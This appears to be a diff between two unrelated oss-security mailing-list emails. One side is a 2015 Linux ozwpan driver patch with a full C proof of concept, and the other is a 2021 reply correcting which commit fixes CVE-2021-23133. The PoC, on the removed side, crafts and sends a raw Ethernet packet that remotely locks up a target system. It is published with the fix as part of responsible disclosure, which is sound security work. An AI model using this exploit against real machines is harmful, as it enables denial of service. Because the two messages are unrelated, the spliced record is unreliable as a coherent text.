@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4550" "Tuesday" "26" "May" "2015" "14:17:49" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1432642669-7289-5-git-send-email-Jason@zx2c4.com>" "179" "[oss-security] [PATCH v2 4/4] ozwpan: unchecked signed subtraction leads to DoS" nil nil nil "5" "2015052612:17:49" "[oss-security] [PATCH v2 4/4] ozwpan: unchecked signed subtraction leads to DoS" (number mark "U       Jason@zx2c4. May 26  179/4550  " thread-indent "\"[oss-security] [PATCH v2 4/4] ozwpan: unchecked signed subtraction leads to DoS\"\n") "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>" ("<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" "<1432642669-7289-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1311" "Monday" "10" "May" "2021" "08:10:53" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" nil "36" "Re: [oss-security] CVE-2021-23133: Linux kernel: race condition in sctp sockets" nil nil nil "5" nil nil (number mark "U       carnil@debia May 10   36/1311  " thread-indent "\"Re: [oss-security] CVE-2021-23133: Linux kernel: race condition in sctp sockets\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-23133: Linux kernel: race condition in sctp sockets" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 22368 invoked by uid 550); 26 May 2015 12:19:02 -0000
+Received: (qmail 14313 invoked by uid 550); 10 May 2021 06:11:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,206 +12,86 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 20424 invoked from network); 26 May 2015 12:18:48 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=yRR9
-	QoEADkdaeMrmyLmnlRX2MDU=; b=SqAbgZIPpyEa8ejvJMlCEOEt4QBD2HASTexw
-	e1VlGdXiSpBa4BIZiP1H3QGjd/UuZkHdzzoO9so94cA5EYpiLV5LY3VTUod4zQYU
-	IHFsCAFF1x+KqcW8jB+ZsZo1XPAsp1qF0J63wAQojULRetxhXlC9nTOg4AW8pjWb
-	W85iTtNTDkqDKQY7A44e12p5XHz3yJq4sOyE5kFV9qMUUv3AsrMlY0Nl535c0YEb
-	ZlAP5DMhgMMe3yuChbIrl5YYKoSYl1Eu8Vv0+ab8IKe6XqLHxEOl1eRFO3/3pl7w
-	46AfZzyIXo2m4BFDxc14AqXP1esliPT7WKnV3tpeElmUGCIJxw==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: oss-security <oss-security@lists.openwall.com>,
-	linux-kernel@vger.kernel.org,
-	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
-	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	devel@driverdev.osuosl.org
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Tue, 26 May 2015 14:17:49 +0200
-Message-Id: <1432642669-7289-5-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.4.1
-In-Reply-To: <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-References: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
- <1432642669-7289-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH v2 4/4] ozwpan: unchecked signed subtraction leads to DoS
+Received: (qmail 14295 invoked from network); 10 May 2021 06:11:06 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=sender:date:from:to:cc:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to:user-agent;
+        bh=mvU15iTiTBfVV0arJuFlHJWyFHICz3YkdC8WiCMb/wg=;
+        b=DNxBSJ1UqllBHUD9MS/lxtlkHliXJmNSMsw/8xm6Md6WZOUs4aYiyxZtXRSh29gzyk
+         TDqTpTGIKxAAaoR3sF1uyxmLYRzdyG1fiU1ot+IBFjXD7dgXsgIYd+xTIHO1TRdbYK03
+         o9ofoPf8urTp8aXqYe7k3gsWEd7mOixBM6X0zv8zRbZ/xIeVdGY83yqI9bs0KVlIputK
+         fVO0ApIbrgi9pLfV/SafMd/+6JmQork9dQonT0LhjmvVvetDfH/iFSs6YKtXuRut+8nP
+         7yBuubyBjN/wFvRoJHZksOtsQ2OLNvn8Xwk5TpK9GBUcvDCTwKImdm+Y1YKx5T+tt1As
+         95bQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:sender:date:from:to:cc:subject:message-id
+         :references:mime-version:content-disposition:in-reply-to:user-agent;
+        bh=mvU15iTiTBfVV0arJuFlHJWyFHICz3YkdC8WiCMb/wg=;
+        b=t+eLRszJX5gLAUbLZhmyNoMuL5u9qXCxqDAyz2Di4HrR7qGUsEdFGWc58RudmNvVVd
+         RiwAJS6d7nnl9X7PFUOJa5GGdHLYoDN2ZK6M5SAiFxR9xYPQO5mcEJKbbMdvg8z7h9lP
+         uzYawT593RTFY/hkb2SYnEVFAFqw4EBuP6/kD+w/+qcjRHnizBbI4U9PfSKSmYCZHmV3
+         cfgA50IJhv0l29tcNHp9Rvn03R1cyad11v88r+101mLdOH7PghWXWPK0j5mvsaO54bi4
+         /JHE07mqWAJyVgZZ7rwPhH/9XowAlXZq4dgcV1skjbEw2Frd+koVlr/PaXut//ezMMvl
+         LBSw==
+X-Gm-Message-State: AOAM530FiulW6OoBtJ40ZtYlDKP1p4f0hm22grrQYvGSBexRNVxsbf4k
+	L/4JzLvKpE1AN4JwXzeV9EA=
+X-Google-Smtp-Source: ABdhPJw290R0b7bQb0oW1Z9AkQ3M2mIP26bW8Qb6RFzZQP5NUpljvui7DChYghxdAGOvRmB27B2RFg==
+X-Received: by 2002:adf:e505:: with SMTP id j5mr28556797wrm.171.1620627055016;
+        Sun, 09 May 2021 23:10:55 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Mon, 10 May 2021 08:10:53 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
+To: Alex Murray <alex.murray@canonical.com>
+Cc: oss-security@lists.openwall.com,
+	Nadav Markus <nmarkus@paloaltonetworks.com>,
+	Or Cohen <orcohen@paloaltonetworks.com>
+Message-ID: <20210510061053.GA23700@lorien.valinor.li>
+References: <CAM6JnLex-+TM+p5aNrcifxG3qmpL+gfXzSTzWpVpbj3_hsp_Fw@mail.gmail.com>
+ <20210510042443.GA19253@lorien.valinor.li>
+ <87fsyvnn9x.fsf@canonical.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <87fsyvnn9x.fsf@canonical.com>
+User-Agent: Mutt/1.10.1 (2018-07-13)
+Subject: Re: [oss-security] CVE-2021-23133: Linux kernel: race condition in
+ sctp sockets
 
-The subtraction here was using a signed integer and did not have any
-bounds checking at all. This commit adds proper bounds checking, made
-easy by use of an unsigned integer. This way, a single packet won't be
-able to remotely trigger a massive loop, locking up the system for a
-considerable amount of time. A PoC follows below, which requires
-ozprotocol.h from this module.
+Hi Alex,
 
-=-=-=-=-=-=
+On Mon, May 10, 2021 at 03:28:02PM +0930, Alex Murray wrote:
+> 
+> On Mon, 2021-05-10 at 13:54:43 +0930, Salvatore Bonaccorso wrote:
+> 
+> > Hi,
+> > 
+> > On Sun, Apr 18, 2021 at 11:41:06AM +0300, Or Cohen wrote:
+> > > Hello,
+> > > 
+> > > This is an announcement about CVE-2021-23133 which is a race-condition
+> > > I found in Linux kernel sctp sockets (net/sctp/socket.c). It can
+> > > lead to kernel
+> > > privilege escalation from the context of a network service or from
+> > > an unprivileged process if certain conditions are met.
+> > > 
+> > > The bug was fixed on April 13, 2021:
+> > > https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b166a20b07382b8bc1dcee2a448715c9c2c81b5b
+> > 
+> > It looks that additionally
+> > https://git.kernel.org/linus/34e5b01186858b36c4d7c87e1a025071e8e2401f
+> > refer to CVE-2021-23133.
+> 
+> It seems b166a20b07382b8bc1dcee2a448715c9c2c81b5b got reverted in the
+> follow-up commit
+> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/sctp/socket.c?id=01bfe5e8e428b475982a98a46cca5755726f3f7f
+> and so 34e5b01186858b36c4d7c87e1a025071e8e2401f would appear to be the
+> most correct fix from what I can tell.
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+Ah right, I missed the revert of the original commit.
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+Thanks for pointing that to me.
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
-
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
-
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
-
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
-
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
-
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-		struct oz_elt oz_elt2;
-		struct oz_multiple_fixed oz_multiple_fixed;
-	} __packed packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 0,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		},
-		.oz_elt2 = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_multiple_fixed) - 3
-		},
-		.oz_multiple_fixed = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_USB_ENDPOINT_DATA,
-			.endpoint = 0,
-			.format = OZ_DATA_F_MULTIPLE_FIXED,
-			.unit_size = 1,
-			.data = {0}
-		}
-	};
-
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index 8552053..1bde6aa 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -326,11 +326,13 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
- 			struct oz_multiple_fixed *body =
- 				(struct oz_multiple_fixed *)data_hdr;
- 			u8 *data = body->data;
--			int n;
-+			unsigned int n;
- 			if (!body->unit_size)
- 				break;
- 			n = (len - sizeof(struct oz_multiple_fixed)+1)
- 				/ body->unit_size;
-+			if (n > len / body->unit_size)
-+				break;
- 			while (n--) {
- 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
- 					data, body->unit_size);
--- 
-2.4.1
-
+Regards,
+Salvatore
